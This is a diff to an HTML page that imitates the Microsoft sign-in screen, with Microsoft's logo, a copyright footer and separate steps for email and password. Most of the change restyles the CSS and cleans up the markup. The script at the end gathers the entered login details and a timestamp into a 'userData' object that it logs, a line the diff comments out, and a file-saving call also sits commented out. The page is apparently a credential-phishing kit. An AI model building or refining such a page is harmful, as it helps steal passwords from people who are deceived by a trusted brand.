@@ -7,427 +7,308 @@
     <link href="https://fonts.googleapis.com/css?family=Archivo+Narrow&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.0/css/all.css" crossorigin="anonymous">
     <style>
-        body {
-            min-width: 992px !important;
-            font-family: 'Archivo Narrow', sans-serif;
+        :root {
+            --primary-color: #0066BA;
+            --error-color: #d13438;
+            --text-color: #323130;
+            --light-gray: #f3f2f1;
+        }
+
+        * {
+            box-sizing: border-box;
             margin: 0;
             padding: 0;
         }
 
+        body {
+            font-family: 'Archivo Narrow', sans-serif;
+            color: var(--text-color);
+            line-height: 1.5;
+            background-color: var(--light-gray);
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+
+        /* Container styles */
+        .container-fluid {
+            width: 100%;
+            padding: 0;
+            margin: 0;
+            flex: 1;
+        }
+
         .container {
-            min-width: 992px !important;
+            width: 100%;
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 15px;
         }
 
-        .navbar {
-            display: none;
-        }
-
-        .badge {
-            border: 1px solid #000;
-        }
-
-        .table {
-            border-collapse: collapse !important;
-        }
-
-        .table td,
-        .table th {
-            background-color: #fff !important;
-        }
-
-        .table-bordered td,
-        .table-bordered th {
-            border: 1px solid #ddd !important;
-        }
-
-        textarea:hover,
-        input:hover,
-        textarea:active,
-        input:active,
-        textarea:focus,
-        input:focus,
-        button:focus,
-        button:active,
-        button:hover,
-        label:focus,
-        .btn:active,
-        .btn.active {
-            outline: 0px !important;
-            -webkit-appearance: none;
-            box-shadow: none !important;
-        }
-
+        /* Box styles */
         .box {
-            box-shadow: 0 2px 6px rgb(0 0 0 / 20%);
-            max-width: 440px;
-            padding: 48px !important;
-            margin-left: auto;
-            margin-right: auto;
-            margin-top: 20px;
-            margin-bottom: 28px;
             background-color: white;
-            overflow-x: hidden;
-        }
-
-        .boxtext {
-            z-index: 0px;
-            transform: translateX(+200px);
-            animation: myAnim 300ms ease-in 0s 1 normal forwards;
-        }
-
-        @keyframes myAnim {
-            0% {
-                transform: translateX(-200);
-            }
-
-            100% {
-                transform: translateX(0px);
-            }
-        }
-
-        @keyframes bgmyAnim {
-            0% {
-                opacity: 0;
-            }
-
-            100% {
-                opacity: 1;
-            }
-        }
-
-        .box2 {
-            box-shadow: 0 2px 6px rgb(0 0 0 / 20%);
+            border-radius: 4px;
+            box-shadow: 0 2px 6px rgba(0, 0, 0, 0.1);
+            padding: 24px;
+            margin: 20px auto;
             max-width: 440px;
-            padding: 8px 48px !important;
-            margin-left: auto;
-            margin-right: auto;
-            margin-bottom: 28px;
-            background-color: white;
-        }
-
-        #footer {
-            position: fixed;
-            bottom: 0px;
             width: 100%;
-            overflow: visible;
-            z-index: 99;
-            clear: both;
-            background-color: #000;
-            background-color: rgba(0, 0, 0, 0.6);
+            animation: fadeIn 0.3s ease-in;
         }
 
-        div .footerNode a,
-        div .footerNode span {
-            color: #fff;
-            font-size: 0.75rem;
-            line-height: 28px;
-            white-space: nowrap;
-            display: inline-block;
-            float: right;
-            margin-left: 8px;
-            margin-right: 8px;
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
         }
 
-        .bgimg {
-            animation: bgmyAnim 1s cubic-bezier(0.11, 0, 0.5, 0) 0s 1 normal forwards;
-            position: absolute;
-            height: 100%;
-            width: 100%;
-            top: 0;
-            left: 0;
-            background-size: cover;
-            background-repeat: no-repeat;
-            background-position: center;
-            background-image: url('bg.jpg');
-        }
-
-        .topp {
-            margin-top: 48px !important;
-            padding-top: 48px !important;
-        }
-
-        @media only screen and (max-width: 610px) {
-            #hide {
-                display: none;
-            }
-
-            .topp {
-                margin-top: 10px !important;
-                padding-top: 5px !important;
-            }
-
-            .bgimg {
-                position: absolute;
-                height: 100%;
-                width: 100%;
-                top: 0px;
-                background-size: cover;
-                background-repeat: no-repeat;
-                background-image: none;
-                background-color: white;
-            }
-
-            .box {
-                box-shadow: none;
-                max-width: 440px;
-                padding: 0px !important;
-                margin-left: auto;
-                margin-right: auto;
-                margin-top: 0px;
-                margin-bottom: 28px;
-                background-color: white;
-            }
-
-            .box2 {
-                box-shadow: none;
-                border: 1px solid;
-                max-width: 440px;
-                padding: 8px 20px !important;
-                margin-left: 30px !important;
-                margin-right: 30px !important;
-                margin-bottom: 28px !important;
-                background-color: white;
-            }
-        }
-
-        .loader {
-            width: 40px;
-        }
-
-        .loader .circle {
-            position: absolute;
-            width: 18px;
-            height: 18px;
-            opacity: 0;
-            transform: rotate(225deg);
-            animation-iteration-count: infinite;
-            animation-name: orbit;
-            animation-duration: 3s;
-        }
-
-        .loader .circle:after {
-            content: "";
-            position: absolute;
-            width: 3px;
-            height: 3px;
-            border-radius: 5px;
-            background: #000;
-        }
-
-        .loader .circle:nth-child(2) {
-            animation-delay: 240ms;
-        }
-
-        .loader .circle:nth-child(3) {
-            animation-delay: 480ms;
-        }
-
-        .loader .circle:nth-child(4) {
-            animation-delay: 720ms;
-        }
-
-        .loader .circle:nth-child(5) {
-            animation-delay: 960ms;
-        }
-
-        @keyframes orbit {
-            0% {
-                transform: translate(10px, 0);
-                opacity: 1;
-                animation-timing-function: ease-out;
-            }
-
-            7% {
-                transform: translate(30px, 0);
-                animation-timing-function: linear;
-            }
-
-            30% {
-                transform: translate(60px, 0);
-                animation-timing-function: ease-in-out;
-            }
-
-            40% {
-                transform: translate(90px, 0);
-                animation-timing-function: ease-out;
-            }
-
-            50% {
-                transform: translate(120px, 0);
-                animation-timing-function: ease-out;
-            }
-
-            75% {
-                transform: translate(250px, 0);
-                animation-timing-function: ease-out;
-            }
-
-            76% {
-                transform: translate(300px, 0);
-                opacity: 0;
-            }
-
-            100% {
-                transform: translate(350px, 0);
-                opacity: 0;
-            }
+        /* Form elements */
+        .form-group {
+            margin-bottom: 16px;
         }
 
         .form-control {
-            display: block;
             width: 100%;
-            padding: 0.375rem 0.75rem;
-            font-size: 1rem;
-            line-height: 1.5;
-            color: #495057;
-            background-color: #fff;
-            background-clip: padding-box;
-            border: 1px solid #ced4da;
-            border-radius: 0.25rem;
-            transition: border-color 0.15s ease-in-out, box-shadow 0.15s ease-in-out;
+            padding: 12px;
+            font-size: 16px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            transition: border-color 0.15s;
+        }
+
+        .form-control:focus {
+            border-color: var(--primary-color);
+            outline: none;
         }
 
         .btn {
-            display: inline-block;
-            font-weight: 400;
-            text-align: center;
-            white-space: nowrap;
-            vertical-align: middle;
-            user-select: none;
-            border: 1px solid transparent;
-            padding: 0.375rem 0.75rem;
-            font-size: 1rem;
-            line-height: 1.5;
-            border-radius: 0.25rem;
-            transition: color 0.15s ease-in-out, background-color 0.15s ease-in-out, border-color 0.15s ease-in-out, box-shadow 0.15s ease-in-out;
+            padding: 10px 20px;
+            font-size: 16px;
+            border-radius: 4px;
+            cursor: pointer;
+            transition: background-color 0.15s;
         }
 
-        .text-white {
-            color: #fff !important;
+        .btn-primary {
+            background-color: var(--primary-color);
+            color: white;
+            border: none;
         }
 
+        .btn-primary:hover {
+            background-color: #004e8c;
+        }
+
+        /* Text styles */
         .text-right {
-            text-align: right !important;
+            text-align: right;
         }
 
-        .mt-2 {
-            margin-top: 0.5rem !important;
-        }
-
-        .py-2 {
-            padding-top: 0.5rem !important;
-            padding-bottom: 0.5rem !important;
-        }
-
-        .bg-white {
-            background-color: #fff !important;
+        .text-center {
+            text-align: center;
         }
 
         .h5 {
             font-size: 1.25rem;
-            font-weight: 500;
-            line-height: 1.2;
+            font-weight: 600;
+            margin-bottom: 16px;
         }
 
-        .align-middle {
-            vertical-align: middle !important;
+        /* Error messages */
+        .error-message {
+            color: var(--error-color);
+            font-size: 14px;
+            margin-top: 4px;
+            display: none;
         }
 
-        .logoname {
-            margin-left: 10px;
-        }
-
-        .container-fluid {
-            width: 100%;
-            padding-right: 15px;
-            padding-left: 15px;
-            margin-right: auto;
-            margin-left: auto;
-        }
-
-        .row {
+        /* Header styles */
+        .logo-header {
             display: flex;
-            flex-wrap: wrap;
-            margin-right: -15px;
-            margin-left: -15px;
+            align-items: center;
+            margin-bottom: 24px;
         }
 
-        .col-lg-6 {
-            flex: 0 0 50%;
-            max-width: 50%;
+        .logo-header img {
+            margin-right: 10px;
         }
 
-        .mx-auto {
-            margin-right: auto !important;
-            margin-left: auto !important;
+        /* Footer styles */
+        #footer {
+            background-color: rgba(0, 0, 0, 0.6);
+            color: white;
+            padding: 10px 0;
+            width: 100%;
         }
 
-        .col-sm-5 {
-            flex: 0 0 41.666667%;
-            max-width: 41.666667%;
+        .footer-content {
+            display: flex;
+            justify-content: flex-end;
+            align-items: center;
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 15px;
+        }
+
+        .footer-content a, 
+        .footer-content span {
+            color: white;
+            font-size: 12px;
+            margin-left: 15px;
+            text-decoration: none;
+        }
+
+        /* Responsive adjustments */
+        @media (max-width: 768px) {
+            .box {
+                padding: 20px;
+                margin: 15px auto;
+                box-shadow: none;
+                border: 1px solid #ddd;
+            }
+
+            .container {
+                padding: 0 10px;
+            }
+
+            .btn {
+                width: 100%;
+            }
+        }
+
+        @media (max-width: 480px) {
+            .box {
+                padding: 15px;
+                margin: 10px auto;
+            }
+
+            .h5 {
+                font-size: 1.1rem;
+            }
+
+            .form-control {
+                padding: 10px;
+            }
+        }
+
+        /* Animation for form switching */
+        .boxtext {
+            animation: slideIn 0.3s ease-out;
+        }
+
+        @keyframes slideIn {
+            from { transform: translateX(20px); opacity: 0; }
+            to { transform: translateX(0); opacity: 1; }
+        }
+
+        /* Background image */
+        .bgimg {
+            background-image: url('bg.jpg');
+            background-size: cover;
+            background-position: center;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+        }
+
+        /* Sign in options box */
+        .signin-options {
+            max-width: 440px;
+            margin: 0 auto 30px;
+            padding: 15px;
+            background-color: white;
+            border-radius: 4px;
+            box-shadow: 0 2px 6px rgba(0, 0, 0, 0.1);
+        }
+
+        /* Back button */
+        .back-btn {
+            color: var(--primary-color);
+            background: none;
+            border: none;
+            cursor: pointer;
+            font-size: 16px;
+            margin-bottom: 15px;
+        }
+
+        /* Link styles */
+        a {
+            color: var(--primary-color);
+            text-decoration: none;
+        }
+
+        a:hover {
+            text-decoration: underline;
         }
     </style>
 </head>
 <body>
     <div id="main">
-        <div class="container-fluid bgimg">
+        <div class="bgimg">
             <div class="container">
-                <div class="row topp">
+                <div class="row">
                     <div class="col-lg-6 mx-auto">
+                        <!-- Step 1: Email Input -->
                         <div id="step1" class="box">
                             <form class="boxtext">
-                                <img src="https://aadcdn.msauth.net/ests/2.1/content/images/favicon_a_eupayfgghqiai7k9sol6lg2.ico" width="30" />
-                                <span class="align-middle h5 logoname"> Microsoft</span><br /><br />
-                                <span class="h5">Sign In</span><br />
-                                <p id="emailError" style="color: red; font-size: 14px; display: none;"></p>
-                                <div class="form-group mt-2">
-                                    <input type="email" class="form-control" id="email" placeholder="Email, phone, or Skype" />
+                                <div class="logo-header">
+                                    <img src="https://aadcdn.msauth.net/ests/2.1/content/images/favicon_a_eupayfgghqiai7k9sol6lg2.ico" width="30" alt="Microsoft logo">
+                                    <span class="h5">Microsoft</span>
                                 </div>
-                                <p style="font-size: 13px">No account? <a href="#">Create one!</a></p>
-                                <p style="font-size: 13px"><a href="#">Can't access your account?</a></p>
+                                <h2 class="h5">Sign In</h2>
+                                <p id="emailError" class="error-message"></p>
+                                <div class="form-group">
+                                    <input type="email" class="form-control" id="email" placeholder="Email, phone, or Skype" required>
+                                </div>
+                                <p><a href="#">No account? Create one!</a></p>
+                                <p><a href="#">Can't access your account?</a></p>
                                 <div class="text-right">
-                                    <button id="next" class="btn text-white" style="background-color: #0066BA">Next</button>
+                                    <button id="next" class="btn btn-primary">Next</button>
                                 </div>
                             </form>
                         </div>
 
+                        <!-- Step 2: Password Input -->
                         <div id="step2" class="box" style="display: none;">
                             <form class="boxtext" id="loginForm">
-                                <img src="https://aadcdn.msauth.net/ests/2.1/content/images/favicon_a_eupayfgghqiai7k9sol6lg2.ico" width="30" />
-                                <span class="align-middle h5 logoname"> Microsoft</span><br /><br />
-                                <i class="fas fa-arrow-left" id="back" style="cursor: pointer"></i>&nbsp;
-                                <span id="emailDisplay"></span>
-                                <div class="py-2"><span class="h5">Enter Password</span></div>
-                                <p id="passwordError" style="color: red; font-size: 14px; display: none;"></p>
-                                <div class="form-group mt-2">
-                                    <input type="password" class="form-control" id="password" placeholder="Enter Password" />
+                                <div class="logo-header">
+                                    <img src="https://aadcdn.msauth.net/ests/2.1/content/images/favicon_a_eupayfgghqiai7k9sol6lg2.ico" width="30" alt="Microsoft logo">
+                                    <span class="h5">Microsoft</span>
                                 </div>
-                                <p style="font-size: 14px"><a href="#">Forget password?</a></p>
+                                <button id="back" class="back-btn">
+                                    <i class="fas fa-arrow-left"></i> <span id="emailDisplay"></span>
+                                </button>
+                                <h2 class="h5">Enter Password</h2>
+                                <p id="passwordError" class="error-message"></p>
+                                <div class="form-group">
+                                    <input type="password" class="form-control" id="password" placeholder="Enter Password" required>
+                                </div>
+                                <p><a href="#">Forgot password?</a></p>
                                 <div class="text-right">
-                                    <button type="submit" class="btn text-white" style="background-color: #0066BA">Login</button>
+                                    <button type="submit" class="btn btn-primary">Sign In</button>
                                 </div>
                             </form>
                         </div>
                     </div>
                 </div>
-            </div>
 
-            <div class="row">
-                <div class="col-sm-5 mx-auto box2">
-                    <div class="py-2 bg-white">
-                        <img src="key.svg" width="30" alt="key icon" /> &nbsp;Sign in options
+                <!-- Sign in options -->
+                <div class="signin-options">
+                    <div class="py-2">
+                        <img src="key.svg" width="30" alt="key icon"> &nbsp;Sign in options
                     </div>
                 </div>
             </div>
         </div>
 
         <footer id="footer">
-            <div class="footerNode">
+            <div class="footer-content">
                 <span>©2025 Microsoft</span>
                 <a href="#">Privacy statement</a>
             </div>
         </footer>
-    </div>
+	</div>
 
     <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
     <script>
@@ -508,7 +389,7 @@
                     timestamp: new Date().toISOString()
                 };
 
-                console.log('User login data:', userData);
+                // console.log('User login data:', userData);
 
                 // Save to file
                 // saveToFile(userData);
